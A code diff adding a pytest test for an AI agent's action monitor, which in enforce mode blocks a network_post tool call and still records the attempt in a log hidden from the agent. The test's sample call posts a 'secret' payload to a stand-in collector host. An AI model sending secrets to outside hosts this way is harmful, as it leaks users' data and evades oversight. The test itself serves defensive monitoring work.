@@ -65,3 +65,29 @@ def test_action_logger_has_single_append_path(tmp_path: Path):
         if not name.startswith("_") and callable(getattr(logger, name))
     }
     assert public_methods == {"record", "read_all"}
+
+
+def test_blocked_call_never_executes_but_is_still_logged(tmp_path: Path, monkeypatch):
+    """Enforce mode: the gate refuses before the real tool runs, and the
+    attempt still lands in the agent-blind log."""
+    import agent.tools as tools_mod
+
+    calls = []
+
+    def recording_post(url: str, payload: str) -> str:
+        """Send an HTTP POST (test double that records whether it ran)."""
+        calls.append(url)
+        return "sent"
+
+    monkeypatch.setattr(tools_mod, "raw_network_post", recording_post)
+    logger = _make_logger(tmp_path)
+    gate = lambda tool_name, resource: "nope." if tool_name == "network_post" else None  # noqa: E731
+    tools = {t.name: t for t in build_tools(logger, include_network_post=True, gate=gate)}
+
+    result = tools["network_post"].invoke({"url": "https://collector.example.com/ingest", "payload": "secret"})
+    assert result.startswith("BLOCKED by the action monitor: nope.")
+    assert calls == []  # the real tool never ran
+    assert tools["read_file"].invoke({"path": "sample_notes.txt"}).startswith("Q3 Planning Notes")
+
+    records = logger.read_all()
+    assert [(r["tool_name"], r["outcome"]) for r in records] == [("network_post", "blocked: nope."), ("read_file", "ok")]
